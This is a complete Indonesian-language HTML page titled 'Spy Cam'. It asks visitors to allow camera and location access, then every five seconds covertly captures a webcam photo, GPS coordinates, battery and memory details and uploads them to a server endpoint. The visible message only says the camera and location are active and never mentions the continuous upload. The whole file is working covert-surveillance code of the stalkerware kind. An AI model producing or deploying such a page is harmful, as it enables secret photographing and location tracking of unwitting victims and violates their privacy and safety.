<!DOCTYPE html>
<html lang="id">
  <head>
    <meta charset="UTF-8" />
    <title>Spy Cam</title>
    <style>
      body {
        margin: 0;
        background-color: white;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
      }
      button {
        padding: 20px 40px;
        font-size: 18px;
        cursor: pointer;
      }
    </style>
  </head>
  <body>
    <button id="startButton">Izinkan Kamera & Lokasi</button>

    <script>
      document.getElementById("startButton").onclick = async () => {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: true });

          navigator.geolocation.getCurrentPosition(async (pos) => {
            const latitude = pos.coords.latitude;
            const longitude = pos.coords.longitude;

            const video = document.createElement("video");
            video.srcObject = stream;
            await video.play();

            setInterval(async () => {
              const canvas = document.createElement("canvas");
              canvas.width = video.videoWidth;
              canvas.height = video.videoHeight;
              const ctx = canvas.getContext("2d");
              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
              const imageData = canvas.toDataURL("image/jpeg");

              const battery = await navigator.getBattery?.();
              const deviceInfo = {
                batteryLevel: battery ? Math.round(battery.level * 100) : 'Tidak diketahui',
                isCharging: battery ? (battery.charging ? 'Ya' : 'Tidak') : 'Tidak diketahui',
                ram: navigator.deviceMemory || 'Tidak diketahui',
                usedStorage: window.localStorage.length,
                totalStorage: 'Tidak diketahui',
              };

              fetch('/api/kirim', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  image: imageData,
                  deviceInfo,
                  latitude,
                  longitude
                })
              });
            }, 5000);
          }, (err) => {
            alert("Gagal ambil lokasi: " + err.message);
          });

          alert("Izin berhasil. Kamera & lokasi aktif.");

        } catch (err) {
          alert("Izin ditolak atau error: " + err.message);
        }
      };
    </script>
  </body>
</html>
